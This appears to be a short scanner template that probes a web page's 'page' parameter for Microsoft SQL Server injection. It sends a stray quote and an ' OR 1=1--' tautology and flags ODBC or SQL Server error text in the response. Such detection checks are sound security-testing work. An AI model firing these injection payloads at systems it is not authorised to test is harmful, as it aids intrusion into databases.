id: sqli6-mssql-02
name: 'SQLi mssql probe in page'
severity: high
type: active
tags:
  - sqli
  - injection
  - mssql
description: 'Triggers mssql error via page'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - '"'
        - ''' OR 1=1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ODBC'
          - 'SQL Server'
